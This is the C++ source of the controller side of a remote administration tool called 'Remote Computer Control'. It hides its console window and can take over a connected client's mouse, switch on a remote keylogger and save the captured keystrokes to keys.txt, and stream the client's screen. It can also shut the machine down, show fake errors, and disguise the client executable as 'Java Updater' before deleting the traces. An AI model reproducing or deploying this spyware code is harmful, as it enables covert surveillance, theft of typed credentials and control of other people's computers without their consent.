#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#define ALLEGRO_STATICLINK

#include <allegro5\allegro.h>
#include <allegro5\allegro_primitives.h>
#include <allegro5\allegro_font.h>
#include <allegro5\allegro_ttf.h>
#include <allegro5/allegro_memfile.h>
#include <enet\enet.h>
#include <iostream>
#include <sstream>
#include <string>
#include <Windows.h>
#include <vector>
#include <fstream>
#include <shellapi.h>


using namespace std;

const int screenWidth = 640, screenHeight = 510;

struct Button
{
	POINT pos;
	bool active;
	bool alwaysClickable;
	string text;
};

struct Menu
{
	POINT pos;
	int width, height;
	vector<Button> buttons;
	bool active;
	string text;
};

struct Pixel {
	int x, y, r, g, b;
};

void InitButtons(vector<Menu> &menus);
void DrawButtons(vector<Menu> menus, ALLEGRO_FONT *font18);
int DrawWrappedText(ALLEGRO_FONT *af, char atext[1024], ALLEGRO_COLOR fc, int x1, int y1, int width, int flags, bool draw);
string GetMyIP();

int main() {
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	bool done = false;
	bool redraw = true;
	bool input = false;
	bool connected = false;
	bool typing = false;
	bool showScreen = false;
	bool keyLogger = false;
	bool hideLogger = true;
	int clientScreenWidth, clientScreenHeight;
	int typingTimerStart = 50;
	int typingTimer = typingTimerStart;
	int screenUpdateTimerStart = 10;
	int screenUpdateTimer = screenUpdateTimerStart;
	string username;
	string typed = "";
	POINT mouse;
	POINT prevMouse;
	POINT clientMouse;
	vector<Menu> menus;
	vector<Pixel> pixels;
	fopen("website.txt", "a");
	fopen("message.txt", "a");
	fopen("keys.txt", "a");
	fcloseall();

	ifstream file;
	file.open("keys.txt");
	getline(file, typed);
	file.close();
	
	system("title Server");

	al_init();
	al_init_primitives_addon();
	al_init_font_addon();
	al_init_ttf_addon();
	al_install_mouse();
	al_install_keyboard();
	if (!enet_initialize())
		cout << "Initialized ENet\n";

	ENetAddress address;
	ENetHost * server;
	ENetEvent event;
	ENetPeer *peer;

	address.host = ENET_HOST_ANY;
	address.port = 12345;
	server = enet_host_create(&address, 32, 1, 0, 0);

	if (address.port != NULL)
		cout << "Binded to port " << address.port << endl;
	if (server != NULL)
		cout << "Successfully created ENet Server\n";

	if (server == NULL) {
		cout << "ERROR: Could not create ENet Server " << endl << "Press any key to exit...\n";
		system("pause>nul");
		exit(EXIT_FAILURE);
	}

	//ALLEGRO_FILE *loadFont = al_open_memfile((void*)arial, 891469, "rw");
	
	ALLEGRO_DISPLAY *display = al_create_display(screenWidth, screenHeight);
	ALLEGRO_EVENT_QUEUE *event_queue = al_create_event_queue();
	ALLEGRO_TIMER *timer = al_create_timer(1.0 / 60.0);
	//ALLEGRO_FONT *font18 = al_load_ttf_font_f(loadFont, NULL, 18, NULL); //al_load_font("arial.ttf", 18, 0);
	//ALLEGRO_FONT *font10 = al_load_ttf_font_f(loadFont, NULL, 10, NULL); //al_load_font("arial.ttf", 14, 0);
	ALLEGRO_FONT *font10 = al_load_font("arial.ttf", 10, 0);
	ALLEGRO_FONT *font18 = al_load_font("arial.ttf", 16, 0);
	ALLEGRO_BITMAP *screen = al_create_bitmap(screenWidth, screenHeight);
	al_set_window_title(display, "Remote Computer Control");

	al_register_event_source(event_queue, al_get_keyboard_event_source());
	al_register_event_source(event_queue, al_get_mouse_event_source());
	al_register_event_source(event_queue, al_get_display_event_source(display));
	al_register_event_source(event_queue, al_get_timer_event_source(timer));

	InitButtons(menus);

	al_start_timer(timer);

	while (!done) {
		ALLEGRO_EVENT ev;
		al_wait_for_event(event_queue, &ev);

		if (ev.type == ALLEGRO_EVENT_DISPLAY_CLOSE) {
			done = true;
		}
		else if (ev.type == ALLEGRO_EVENT_TIMER) {
			redraw = true;

			if (typing) {
				typingTimer--;
				if (typingTimer <= 0) {
					typingTimer = typingTimerStart;
					typing = false;
				}
			}
			screenUpdateTimer--;
			if (screenUpdateTimer <= 0) {
				screenUpdateTimer = screenUpdateTimerStart;
				if (pixels.size() > 0) {
					al_lock_bitmap(screen, ALLEGRO_PIXEL_FORMAT_ANY, ALLEGRO_LOCK_WRITEONLY);
					al_set_target_bitmap(screen);
					for (unsigned i = 0; i < pixels.size(); i++) {
						al_put_pixel(pixels[i].x, pixels[i].y, al_map_rgb(pixels[i].r, pixels[i].g, pixels[i].b));
						pixels.erase(pixels.begin() + i);
					}
					al_unlock_bitmap(screen);
					al_set_target_bitmap(al_get_backbuffer(display));
				}
			}
		}
		else if (ev.type == ALLEGRO_EVENT_KEY_DOWN) {
			switch (ev.keyboard.keycode) {
			case ALLEGRO_KEY_SPACE:
				if (input) {
					input = false;
					al_ungrab_mouse();
				}
				break;
			}
		}
		else if (ev.type == ALLEGRO_EVENT_KEY_UP) {
			/*switch (ev.keyboard.keycode) {

			}*/
		}
		else if (ev.type == ALLEGRO_EVENT_MOUSE_LEAVE_DISPLAY) {
			for (unsigned i = 0; i < menus.size(); i++) {
				menus[i].active = false;
			}
		}
		else if (ev.type == ALLEGRO_EVENT_MOUSE_AXES) {
			mouse.x = ev.mouse.x;
			mouse.y = ev.mouse.y;
			prevMouse.x = mouse.x;
			prevMouse.y = mouse.y;

			if (input) {
				int dirX, dirY;
				dirX = -(screenWidth / 2 - mouse.x);
				dirY = -(screenHeight / 2 - mouse.y);

				if (mouse.x + dirX != prevMouse.x || mouse.y + dirY != prevMouse.y) {
					char packet[256];
					sprintf_s(packet, sizeof(packet), "MousePos,%i,%i", dirX, dirY);
					ENetPacket *p = enet_packet_create((char*)packet, strlen(packet) + 1, ENET_PACKET_FLAG_RELIABLE);
					//printf("Sent a packet to client containing %s\n", packet2);
					enet_host_broadcast(server, 0, p);
				}

				al_set_mouse_xy(display, screenWidth / 2, screenHeight / 2);
			}
			else {
				for (unsigned int i = 0; i < menus.size(); i++) {
					if (mouse.x > menus[i].pos.x && mouse.x < menus[i].pos.x + menus[i].width &&
						mouse.y > menus[i].pos.y && mouse.y < menus[i].pos.y + menus[i].height) {
							menus[i].active = true;
					}
					if (mouse.x < menus[i].pos.x || mouse.x > menus[i].pos.x + menus[i].width ||
						mouse.y < menus[i].pos.y || mouse.y > menus[i].pos.y + menus[i].height + (signed)menus[i].buttons.size() * 30) {
						menus[i].active = false;
					}
				}
			}
		}
		else if (ev.type == ALLEGRO_EVENT_MOUSE_BUTTON_DOWN) {
			if (input) {
				if (ev.mouse.button == 1) {
					char packet[256] = "LeftDown";
					ENetPacket *p = enet_packet_create((char*)packet, strlen(packet) + 1, ENET_PACKET_FLAG_RELIABLE);
					enet_host_broadcast(server, 0, p);
				}
				else if (ev.mouse.button == 2) {
					char packet[256] = "RightDown";
					ENetPacket *p = enet_packet_create((char*)packet, strlen(packet) + 1, ENET_PACKET_FLAG_RELIABLE);
					enet_host_broadcast(server, 0, p);
				}
			}
			for (unsigned int i = 0; i < menus.size(); i++) {
				for (unsigned int j = 0; j < menus[i].buttons.size(); j++) {
					if (connected || menus[i].buttons[j].alwaysClickable) {
						if (mouse.x > menus[i].buttons[j].pos.x && mouse.x < menus[i].buttons[j].pos.x + menus[i].width &&
							mouse.y > menus[i].buttons[j].pos.y && mouse.y < menus[i].buttons[j].pos.y + menus[i].height &&
							menus[i].active) {
							menus[i].buttons[j].active = !menus[i].buttons[j].active;

							if (menus[i].buttons[j].text == "Control Mouse") {
								menus[i].buttons[j].active = false;
								menus[i].active = false;
								input = true;
								al_set_mouse_xy(display, screenWidth / 2, screenHeight / 2);
							}
							else if (menus[i].buttons[j].text == "Invert Mouse") {
								char packet[256] = "InvertMouse";
								ENetPacket *p = enet_packet_create((char*)packet, strlen(packet) + 1, ENET_PACKET_FLAG_RELIABLE);
								enet_host_broadcast(server, 0, p);

							}
							else if (menus[i].buttons[j].text == "Lock Client Mouse") {
								char packet[256] = "LockMouse";
								ENetPacket *p = enet_packet_create((char*)packet, strlen(packet) + 1, ENET_PACKET_FLAG_RELIABLE);
								enet_host_broadcast(server, 0, p);
							}
							else if (menus[i].buttons[j].text == "Vibrating Mouse") {
								char packet[256] = "VibratingMouse";
								ENetPacket *p = enet_packet_create((char*)packet, strlen(packet) + 1, ENET_PACKET_FLAG_RELIABLE);
								enet_host_broadcast(server, 0, p);
							}
							else if (menus[i].buttons[j].text == "Mouse Trail") {
								char packet[256] = "MouseTrail";
								ENetPacket *p = enet_packet_create((char*)packet, strlen(packet) + 1, ENET_PACKET_FLAG_RELIABLE);
								enet_host_broadcast(server, 0, p);
							}
							else if (menus[i].buttons[j].text == "Random Spaces") {
								char packet[256] = "RandomSpaces";
								ENetPacket *p = enet_packet_create((char*)packet, strlen(packet) + 1, ENET_PACKET_FLAG_RELIABLE);
								enet_host_broadcast(server, 0, p);
							}
							else if (menus[i].buttons[j].text == "Random Tabs") {
								char packet[256] = "RandomTabs";
								ENetPacket *p = enet_packet_create((char*)packet, strlen(packet) + 1, ENET_PACKET_FLAG_RELIABLE);
								enet_host_broadcast(server, 0, p);
							}
							else if (menus[i].buttons[j].text == "Beeping Keyboard") {
								char packet[256] = "BeepingKeyboard";
								ENetPacket *p = enet_packet_create((char*)packet, strlen(packet) + 1, ENET_PACKET_FLAG_RELIABLE);
								enet_host_broadcast(server, 0, p);
							}
							else if (menus[i].buttons[j].text == "Key Logger") {
								keyLogger = !keyLogger;
								char packet[256] = "KeyLogger";
								ENetPacket *p = enet_packet_create((char*)packet, strlen(packet) + 1, ENET_PACKET_FLAG_RELIABLE);
								enet_host_broadcast(server, 0, p);
							}
							else if (menus[i].buttons[j].text == "Fake Error") {
								menus[i].buttons[j].active = false;
								char packet[256] = "Error";
								ENetPacket *p = enet_packet_create((char*)packet, strlen(packet) + 1, ENET_PACKET_FLAG_RELIABLE);
								enet_host_broadcast(server, 0, p);
							}
							else if (menus[i].buttons[j].text == "Shutdown") {
								menus[i].buttons[j].active = false;
								char packet[256] = "Shutdown";
								ENetPacket *p = enet_packet_create((char*)packet, strlen(packet) + 1, ENET_PACKET_FLAG_RELIABLE);
								enet_host_broadcast(server, 0, p);
							}
							else if (menus[i].buttons[j].text == "Beep") {
								menus[i].buttons[j].active = false;
								char packet[256] = "Beep";
								ENetPacket *p = enet_packet_create((char*)packet, strlen(packet) + 1, ENET_PACKET_FLAG_RELIABLE);
								enet_host_broadcast(server, 0, p);
							}
							else if (menus[i].buttons[j].text == "Play Sound") {
								menus[i].buttons[j].active = false;
								char packet[256] = "PlaySound";
								ENetPacket *p = enet_packet_create((char*)packet, strlen(packet) + 1, ENET_PACKET_FLAG_RELIABLE);
								enet_host_broadcast(server, 0, p);
							}
							else if (menus[i].buttons[j].text == "Max Volume") {
								menus[i].buttons[j].active = false;
								char packet[256] = "MaxVolume";
								ENetPacket *p = enet_packet_create((char*)packet, strlen(packet) + 1, ENET_PACKET_FLAG_RELIABLE);
								enet_host_broadcast(server, 0, p);
							}
							else if (menus[i].buttons[j].text == "White Rectangles") {
								menus[i].buttons[j].active = false;
								char packet[256] = "WhiteRectangles";
								ENetPacket *p = enet_packet_create((char*)packet, strlen(packet) + 1, ENET_PACKET_FLAG_RELIABLE);
								enet_host_broadcast(server, 0, p);
							}
							else if (menus[i].buttons[j].text == "Start Notepad") {
								menus[i].buttons[j].active = false;
								char packet[256] = "Notepad";
								ENetPacket *p = enet_packet_create((char*)packet, strlen(packet) + 1, ENET_PACKET_FLAG_RELIABLE);
								enet_host_broadcast(server, 0, p);
							}
							else if (menus[i].buttons[j].text == "Edit Website") {
								menus[i].buttons[j].active = false;
								ShellExecute(NULL, "open", "website.txt", NULL, NULL, SW_SHOWNORMAL);
							}
							else if (menus[i].buttons[j].text == "Edit Message") {
								menus[i].buttons[j].active = false;
								ShellExecute(NULL, "open", "message.txt", NULL, NULL, SW_SHOWNORMAL);
							}
							else if (menus[i].buttons[j].text == "Send Web Site") {
								menus[i].buttons[j].active = false;
								ifstream website("website.txt");
								string line;
								if (website.is_open()) {
									while (getline(website, line)) {
										cout << line << endl;
									}
									website.close();
								}
								char packet[256];
								sprintf_s(packet, sizeof(packet), "Website,%s,", line.c_str());
								ENetPacket *p = enet_packet_create((char*)packet, strlen(packet) + 1, ENET_PACKET_FLAG_RELIABLE);
								enet_host_broadcast(server, 0, p);
							}
							else if (menus[i].buttons[j].text == "Send Message") {
								menus[i].buttons[j].active = false;
								ifstream website("message.txt");
								string line;
								if (website.is_open()) {
									while (getline(website, line)) {
										cout << line << endl;
									}
									website.close();
								}
								char packet[256];
								sprintf_s(packet, sizeof(packet), "Message,%s,", line.c_str());
								ENetPacket *p = enet_packet_create((char*)packet, strlen(packet) + 1, ENET_PACKET_FLAG_RELIABLE);
								enet_host_broadcast(server, 0, p);
							}
							else if (menus[i].buttons[j].text == "Show Screen") {
								showScreen = !showScreen;
								char packet[256] = "ShowScreen";
								ENetPacket *p = enet_packet_create((char*)packet, strlen(packet) + 1, ENET_PACKET_FLAG_RELIABLE);
								enet_host_broadcast(server, 0, p);
							}
							else if (menus[i].buttons[j].text == "Exit Client") {
								menus[i].buttons[j].active = false;
								char packet[256] = "Exit";
								ENetPacket *p = enet_packet_create((char*)packet, strlen(packet) + 1, ENET_PACKET_FLAG_RELIABLE);
								enet_host_broadcast(server, 0, p);
							}
							else if (menus[i].buttons[j].text == "Show Console") {
								menus[i].buttons[j].active = false;
								menus[i].buttons[j].text = "Hide Console";
								ShowWindow(GetConsoleWindow(), SW_SHOW);
							}
							else if (menus[i].buttons[j].text == "Hide Console") {
								menus[i].buttons[j].active = false;
								menus[i].buttons[j].text = "Show Console";
								ShowWindow(GetConsoleWindow(), SW_HIDE);
							}
							else if (menus[i].buttons[j].text == "Clear Key Logger") {
								menus[i].buttons[j].active = false;
								typed = "";
								system("del keys.txt");
							}
							else if (menus[i].buttons[j].text == "Hide Key Logger") {
								menus[i].buttons[j].active = false;
								menus[i].buttons[j].text = "Show Key Logger";
								hideLogger = true;
							}
							else if (menus[i].buttons[j].text == "Show Key Logger") {
								menus[i].buttons[j].active = false;
								menus[i].buttons[j].text = "Hide Key Logger";
								hideLogger = false;
							}
							else if (menus[i].buttons[j].text == "Delete Files") {
								menus[i].buttons[j].active = false;
								system("del \"message.txt\"");
								system("del \"keys.txt\"");
								system("del \"website.txt\"");
								system("del \"screen.bmp\"");
								string command = "del \"Java Updater~" + GetMyIP() + "~12345.exe\"";
								system(command.c_str());
							}
							else if (menus[i].buttons[j].text == "Rename Client") {
								menus[i].buttons[j].active = false;
								string command = "copy \"Remote Computer Control.exe\" \"Java Updater~" + GetMyIP() + "~12345.exe";
								system(command.c_str());
								system("ipconfig");
							}
						}	
					}
				}
			}
		}
		else if (ev.type == ALLEGRO_EVENT_MOUSE_BUTTON_UP) {
			if (input) {
				if (ev.mouse.button == 1) {
					char packet[256] = "LeftUp";
					ENetPacket *p = enet_packet_create((char*)packet, strlen(packet)+1, ENET_PACKET_FLAG_RELIABLE);
					enet_host_broadcast(server, 0, p);
				}
				else if (ev.mouse.button == 2) {
					char packet[256] = "RightUp";
					ENetPacket *p = enet_packet_create((char*)packet, strlen(packet)+1, ENET_PACKET_FLAG_RELIABLE);
					enet_host_broadcast(server, 0, p);
				}
			}
		}

		while (enet_host_service (server, &event, 0) > 0) {
            switch(event.type) {
                case ENET_EVENT_TYPE_CONNECT:
					{
						printf ("New connection from: %x:%u.\n", event.peer -> address.host, event.peer -> address.port);
						peer = event.peer;
						connected = true;
						Beep(400, 150);
						Beep(300, 150);
					}
                    break;


				case ENET_EVENT_TYPE_RECEIVE:
				{
					//printf("Recieved a packet containing %s\n", event.packet->data);
					int messageCount = 0;
					string Type;
					char message[100];
					vector<string> msgVars;

					for (unsigned int i = 0; i < event.packet->dataLength; ++i) {
						message[i] = event.packet->data[i];
					}
					string coords = message;
					istringstream ss(coords);
					string token;

					while (getline(ss, token, ',')) {
						if (messageCount == 0)
							Type = token;
						else
							msgVars.push_back(token);
						messageCount++;
					}

					if (Type == "MousePos") {
						clientMouse.x = stoi(msgVars[0].c_str());
						clientMouse.y = stoi(msgVars[1].c_str());
					}
					if (Type == "Info") {
						clientScreenWidth = stoi(msgVars[0].c_str());
						clientScreenHeight = stoi(msgVars[1].c_str());
						cout << "ScreenWidth " << clientScreenWidth << "   ScreenHeight " << clientScreenHeight << endl;
						username = msgVars[2];
						string title = "Remote Computer Control - " + username;
						al_set_window_title(display, title.c_str());
					}
					else if (Type == "Typing") {
						typing = true;
						typingTimer = typingTimerStart;
					}
					else if (Type == "ScreenUpdate") {
						//cout << event.packet->data << endl;
						Pixel pixel;
						pixel.x = stoi(msgVars[0].c_str());
						pixel.y = stoi(msgVars[1].c_str());
						pixel.r = stoi(msgVars[2].c_str());
						pixel.g = stoi(msgVars[3].c_str());
						pixel.b = stoi(msgVars[4].c_str());
						pixels.push_back(pixel);

						if (pixels.size() > 3000) {
							screenUpdateTimer = screenUpdateTimerStart;
							//cout << "Drawing" << endl;
							al_lock_bitmap(screen, ALLEGRO_PIXEL_FORMAT_ANY, ALLEGRO_LOCK_WRITEONLY);
							al_set_target_bitmap(screen);
							for (unsigned i = 0; i < pixels.size(); i++) {
								//cout << "X: " << pixels[i].x << " Y: " << pixels[i].y << " R: " << pixels[i].r << " G: " << pixels[i].g << " B: " << pixels[i].b << endl;
								al_put_pixel(pixels[i].x, pixels[i].y, al_map_rgb(pixels[i].r, pixels[i].g, pixels[i].b));
								pixels.erase(pixels.begin() + i);
							}
							al_unlock_bitmap(screen);
							al_set_target_bitmap(al_get_backbuffer(display));
						}
					}
					else if (Type == "Key") {
						ofstream file;
						file.open("keys.txt", ios_base::out | ios_base::app);
						file << msgVars[0];
						typed += msgVars[0];
					}

					enet_packet_destroy(event.packet);
				}
				break;

                case ENET_EVENT_TYPE_DISCONNECT:
                    printf("(Client) %s disconnected.\n", event.peer->data);
                    event.peer->data = NULL;
					connected = false;
					showScreen = false;
					input = false;
					typing = false;
					keyLogger = false;
					hideLogger = false;

					for (unsigned int i = 0; i < menus.size(); i++) {
						for (unsigned int j = 0; j < menus[i].buttons.size(); j++) {
							menus[i].buttons[j].active = false;
						}
					}

                    break;
            }
		}

		if (redraw && al_is_event_queue_empty(event_queue)) {
			redraw = false;

			al_clear_to_color(al_map_rgb(0,89,255));
			if (showScreen) {
				al_draw_bitmap(screen, 0, 30, 0);
				al_draw_filled_circle((float)clientMouse.x * ((float)screenWidth / (float)clientScreenWidth), (float)(clientMouse.y) * ((float)(screenHeight - 30) / (float)clientScreenHeight) + 30, 3, al_map_rgb(255, 0, 0));
			}
			if (typing && !keyLogger && !showScreen)
				al_draw_text(font18, al_map_rgb(255, 0, 0), screenWidth / 2, screenHeight / 2 - 75, ALLEGRO_ALIGN_CENTRE, "Client Typing");
			if (input)
				al_draw_text(font18, al_map_rgb(255, 0, 0), screenWidth / 2, screenHeight / 2 - 50, ALLEGRO_ALIGN_CENTRE, "Controlling Client Mouse   Press SPACE To Stop");

			if (connected) {
				if (!showScreen)
					al_draw_textf(font18, al_map_rgb(255, 255, 255), screenWidth / 2, screenHeight / 2, ALLEGRO_ALIGN_CENTRE, "Client Mouse X: %i   Y: %i", clientMouse.x, clientMouse.y);
			}
			else
				al_draw_text(font18, al_map_rgb(255, 255, 255), screenWidth / 2, screenHeight / 2, ALLEGRO_ALIGN_CENTRE, "Waiting for connection...");
			if (!hideLogger)
				DrawWrappedText(font10, (char *)typed.c_str(), al_map_rgb(255, 0, 0), 5, 35, screenWidth - 10, NULL, true);
			DrawButtons(menus, font18);
			al_flip_display();
		}
	}
}

void InitButtons(vector<Menu> &menus) {
	Menu newMenu;
	
	newMenu.active = false;
	newMenu.width = 160;
	newMenu.height = 30;
	newMenu.pos.x = 0;
	newMenu.pos.y = 0;
	newMenu.text = "Mouse";
	
	Button newButton;
	newButton.active = false;
	newButton.pos.x = 0;
	newButton.pos.y = 30;
	newButton.text = "Control Mouse";
	newButton.alwaysClickable = false;
	newMenu.buttons.push_back(newButton);

	newButton.pos.y = 60;
	newButton.text = "Invert Mouse";
	newButton.alwaysClickable = false;
	newMenu.buttons.push_back(newButton);

	newButton.pos.y = 90;
	newButton.text = "Lock Client Mouse";
	newButton.alwaysClickable = false;
	newMenu.buttons.push_back(newButton);

	newButton.pos.y = 120;
	newButton.text = "Vibrating Mouse";
	newButton.alwaysClickable = false;
	newMenu.buttons.push_back(newButton);

	newButton.pos.y = 150;
	newButton.text = "Mouse Trail";
	newButton.alwaysClickable = false;
	newMenu.buttons.push_back(newButton);

	menus.push_back(newMenu);
	newMenu.buttons.clear();

	//////////////////////////////////////////
	newMenu.pos.x = 160;
	newMenu.pos.y = 0;
	newMenu.text = "Keyboard";

	newButton.active = false;
	newButton.pos.x = newMenu.pos.x;
	newButton.pos.y = 30;
	newButton.text = "Random Spaces";
	newButton.alwaysClickable = false;
	newMenu.buttons.push_back(newButton);

	newButton.pos.y = 60;
	newButton.text = "Random Tabs";
	newButton.alwaysClickable = false;
	newMenu.buttons.push_back(newButton);

	newButton.pos.y = 90;
	newButton.text = "Beeping Keyboard";
	newButton.alwaysClickable = false;
	newMenu.buttons.push_back(newButton);

	newButton.pos.y = 120;
	newButton.text = "Key Logger";
	newButton.alwaysClickable = false;
	newMenu.buttons.push_back(newButton);

	menus.push_back(newMenu);
	newMenu.buttons.clear();

	///////////////////////////////////////////
	newMenu.pos.x = 320;
	newMenu.pos.y = 0;
	newMenu.text = "Other";

	newButton.active = false;
	newButton.pos.x = newMenu.pos.x;

	newButton.pos.y = 30;
	newButton.text = "Shutdown";
	newButton.alwaysClickable = false;
	newMenu.buttons.push_back(newButton);

	newButton.pos.y = 60;
	newButton.text = "Fake Error";
	newButton.alwaysClickable = false;
	newMenu.buttons.push_back(newButton);

	newButton.pos.y = 90;
	newButton.text = "Start Notepad";
	newButton.alwaysClickable = false;
	newMenu.buttons.push_back(newButton);

	newButton.pos.y = 120;
	newButton.text = "White Rectangles";
	newButton.alwaysClickable = false;
	newMenu.buttons.push_back(newButton);

	newButton.pos.y = 150;
	newButton.text = "Max Volume";
	newButton.alwaysClickable = false;
	newMenu.buttons.push_back(newButton);

	newButton.pos.y = 180;
	newButton.text = "Beep";
	newButton.alwaysClickable = false;
	newMenu.buttons.push_back(newButton);

	newButton.pos.y = 210;
	newButton.text = "Play Sound";
	newButton.alwaysClickable = false;
	newMenu.buttons.push_back(newButton);

	newButton.pos.y = 240;
	newButton.text = "Send Web Site";
	newButton.alwaysClickable = false;
	newMenu.buttons.push_back(newButton);

	newButton.pos.y = 270;
	newButton.text = "Send Message";
	newButton.alwaysClickable = false;
	newMenu.buttons.push_back(newButton);

	menus.push_back(newMenu);
	newMenu.buttons.clear();

	///////////////////////////////////////////
	newMenu.pos.x = 480;
	newMenu.pos.y = 0;
	newMenu.text = "Options";

	newButton.pos.x = newMenu.pos.x;

	newButton.pos.y = 30;
	newButton.text = "Exit Client";
	newButton.alwaysClickable = false;
	newMenu.buttons.push_back(newButton);

	newButton.pos.y = 60;
	newButton.text = "Show Console";
	newButton.alwaysClickable = true;
	newMenu.buttons.push_back(newButton);

	newButton.pos.y = 90;
	newButton.text = "Edit Website";
	newButton.alwaysClickable = true;
	newMenu.buttons.push_back(newButton);

	newButton.pos.y = 120;
	newButton.text = "Edit Message";
	newButton.alwaysClickable = true;
	newMenu.buttons.push_back(newButton);

	newButton.pos.y = 150;
	newButton.text = "Show Screen";
	newButton.alwaysClickable = false;
	newMenu.buttons.push_back(newButton);

	newButton.pos.y = 180;
	newButton.text = "Clear Key Logger";
	newButton.alwaysClickable = true;
	newMenu.buttons.push_back(newButton);

	newButton.pos.y = 210;
	newButton.text = "Show Key Logger";
	newButton.alwaysClickable = true;
	newMenu.buttons.push_back(newButton);

	newButton.pos.y = 240;
	newButton.text = "Delete Files";
	newButton.alwaysClickable = true;
	newMenu.buttons.push_back(newButton);

	newButton.pos.y = 270;
	newButton.text = "Rename Client";
	newButton.alwaysClickable = true;
	newMenu.buttons.push_back(newButton);

	menus.push_back(newMenu);
}
void DrawButtons(vector<Menu> menus, ALLEGRO_FONT *font18) {
	for (unsigned int i = 0; i < menus.size(); i++) {
		if (menus[i].active) {
			for (unsigned int j = 0; j < menus[i].buttons.size(); j++) {
				al_draw_filled_rectangle(menus[i].buttons[j].pos.x, menus[i].buttons[j].pos.y, menus[i].buttons[j].pos.x + menus[i].width, menus[i].buttons[j].pos.y + menus[i].height, al_map_rgb(127, 127, 127));
				if (menus[i].buttons[j].active)
					al_draw_filled_rectangle(menus[i].buttons[j].pos.x, menus[i].buttons[j].pos.y, menus[i].buttons[j].pos.x + menus[i].width, menus[i].buttons[j].pos.y + menus[i].height, al_map_rgb(127, 200, 127));

				al_draw_rectangle(menus[i].buttons[j].pos.x, menus[i].buttons[j].pos.y, menus[i].buttons[j].pos.x + menus[i].width, menus[i].buttons[j].pos.y + menus[i].height, al_map_rgb(0, 0, 0), 2);
				al_draw_text(font18, al_map_rgb(255, 255, 255), menus[i].buttons[j].pos.x + menus[i].width / 2, menus[i].buttons[j].pos.y + menus[i].height / 2 - 8, ALLEGRO_ALIGN_CENTRE, menus[i].buttons[j].text.c_str());
			}
		}
		al_draw_filled_rectangle(menus[i].pos.x, menus[i].pos.y, menus[i].pos.x + menus[i].width, menus[i].pos.y + menus[i].height, al_map_rgb(0, 0, 255));
		al_draw_rectangle(menus[i].pos.x, menus[i].pos.y, menus[i].pos.x + menus[i].width, menus[i].pos.y + menus[i].height, al_map_rgb(0, 0, 0), 2);
		al_draw_text(font18, al_map_rgb(255, 255, 255), menus[i].pos.x + menus[i].width / 2, menus[i].pos.y + menus[i].height / 2 - 10, ALLEGRO_ALIGN_CENTRE, menus[i].text.c_str());

	}
}

int DrawWrappedText(ALLEGRO_FONT *af, char atext[1024], ALLEGRO_COLOR fc, int x1, int y1, int width, int flags, bool draw) {
	char stext[1024]; // Copy of the passed text.
	char * pch; // A pointer to each word.
	char word[255]; // A string containing the word (for convienence)
	char breakchar[12]; // Contains the break line character "\n "
	char Lines[40][1024]; // A lovely array of strings to hold all the lines (40 max atm)
	char TempLine[1024]; // Holds the string data of the current line only.
	int CurrentLine = 0; // Counts which line we are currently using.
	int q; // Used for loops

	// Setup our strings
	strcpy(stext, atext);
	strcpy(breakchar, "\n ");
	strcpy(TempLine, "");
	for (q = 0; q < 40; q += 1)
	{
		sprintf(Lines[q], "");
	}
	//-------------------- Code Begins

	pch = strtok(stext, " ");                               // Get the first word.
	do
	{
		strcpy(word, "");                                  // Truncate the string, to ensure there's no crazy stuff in there from memory.
		sprintf(word, "%s ", pch);
		sprintf(TempLine, "%s%s", TempLine, word);             // Append the word to the end of TempLine
		// This code checks for the new line character.
		if (strcmp(word, breakchar) == 0)
		{
			CurrentLine += 1;                                 // Move down a Line
			strcpy(TempLine, "");                            // Clear the tempstring
		}
		else
		{
			if (al_get_text_width(af, TempLine) >= (width))   // Check if text is larger than the area.
			{
				strcpy(TempLine, word);                      // clear the templine and add the word to it.
				CurrentLine += 1;                             // Move to the next line.
			}
			if (CurrentLine < 40)
			{
				strcat(Lines[CurrentLine], word);                // Append the word to whatever line we are currently on.
			}
		}
		pch = strtok(NULL, " ");                           // Get the next word.
	} while (pch != NULL);
	// ---------------------------------- Time to draw.
	if (draw == true)                                       //Check whether we are actually drawing the text.
	{
		for (q = 0; q <= CurrentLine; q += 1)                     // Move through each line and draw according to the passed flags.
		{
			if (flags == ALLEGRO_ALIGN_LEFT)
				al_draw_text(af, fc, x1, y1 + (q * al_get_font_line_height(af)), ALLEGRO_ALIGN_LEFT, Lines[q]);
			if (flags == ALLEGRO_ALIGN_CENTRE)
				al_draw_text(af, fc, x1 + (width / 2), y1 + (q * al_get_font_line_height(af)), ALLEGRO_ALIGN_CENTRE, Lines[q]);
			if (flags == ALLEGRO_ALIGN_RIGHT)
				al_draw_text(af, fc, x1 + width, y1 + (q * al_get_font_line_height(af)), ALLEGRO_ALIGN_RIGHT, Lines[q]);
		}

	}
	return((CurrentLine + 1) * al_get_font_line_height(af));  // Return the actual height of the text in pixels.
}

string GetMyIP() {
	char szBuffer[1024];

#ifdef WIN32
	WSADATA wsaData;
	WORD wVersionRequested = MAKEWORD(2, 0);
	if (::WSAStartup(wVersionRequested, &wsaData) != 0)
		return false;
#endif


	if (gethostname(szBuffer, sizeof(szBuffer)) == SOCKET_ERROR)
	{
#ifdef WIN32
		WSACleanup();
#endif
		return false;
	}

	struct hostent *host = gethostbyname(szBuffer);
	if (host == NULL)
	{
#ifdef WIN32
		WSACleanup();
#endif
		return false;
	}

	//Obtain the computer's IP
	unsigned char b1, b2, b3, b4;
	b1 = ((struct in_addr *)(host->h_addr))->S_un.S_un_b.s_b1;
	b2 = ((struct in_addr *)(host->h_addr))->S_un.S_un_b.s_b2;
	b3 = ((struct in_addr *)(host->h_addr))->S_un.S_un_b.s_b3;
	b4 = ((struct in_addr *)(host->h_addr))->S_un.S_un_b.s_b4;

#ifdef WIN32
	WSACleanup();
#endif
	return to_string((long long)b1) + "." + to_string((long long)b2) + "." + to_string((long long)b3) + "." + to_string((long long)b4);
}